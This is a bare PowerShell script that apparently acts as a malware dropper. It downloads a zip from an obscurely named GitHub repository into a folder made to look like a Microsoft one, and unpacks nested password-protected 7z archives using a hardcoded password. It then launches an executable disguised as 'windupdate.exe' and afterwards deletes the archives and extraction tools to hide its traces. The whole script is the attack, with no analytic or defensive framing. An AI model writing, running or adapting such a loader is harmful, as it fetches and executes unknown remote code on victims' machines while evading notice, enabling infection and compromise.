$p = 'Sc8#mK92_vXp'
$v = "$env:LOCALAPPDATA\Microsoft\Vault\"

$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")

if (!(Test-Path $v)) { New-Item -ItemType Directory -Path $v -Force | Out-Null }

$z = "$v\update_cache.zip"
$wc.DownloadFile('https://github.com/apda89787/tgv5byrn-uynu7ytthgf/raw/refs/heads/main/update_cache.zip', $z)

Expand-Archive -Path $z -DestinationPath $v -Force
Set-Location $v

function Wait-File {
    param($Path, $TimeoutSec = 10)
    $end = (Get-Date).AddSeconds($TimeoutSec)
    while ((Get-Date) -lt $end) {
        if (Test-Path $Path) {
            $size1 = (Get-Item $Path).Length
            Start-Sleep -Milliseconds 200
            $size2 = (Get-Item $Path).Length
            if ($size1 -eq $size2) { return $true }
        }
        Start-Sleep -Milliseconds 200
    }
    return $false
}

$outer = 'outer.7z'
if (Test-Path $outer) {
    & '.\7za.exe' x $outer "-p$p" -y -o"$v" | Out-Null
    if (-not (Wait-File "$v\inner.7z" -TimeoutSec 15)) {
        exit 1
    }
}

$innerPath = "$v\inner.7z"
if ((Test-Path $innerPath) -and (Test-Path '.\7za.exe')) {
    & '.\7za.exe' x $innerPath "-p$p" -y -o"$v" | Out-Null
    if (-not (Wait-File "$v\windupdate.exe" -TimeoutSec 15)) {
        exit 1
    }
}

if (Test-Path "$v\windupdate.exe") {
    Start-Process -FilePath "$v\windupdate.exe" -WorkingDirectory $v
}

Start-Sleep -Seconds 30
Remove-Item $z -Force -ErrorAction SilentlyContinue
Get-ChildItem $v -Include *.7z, 7za.exe, 7z.dll, 7zxa.dll | Remove-Item -Force -ErrorAction SilentlyContinue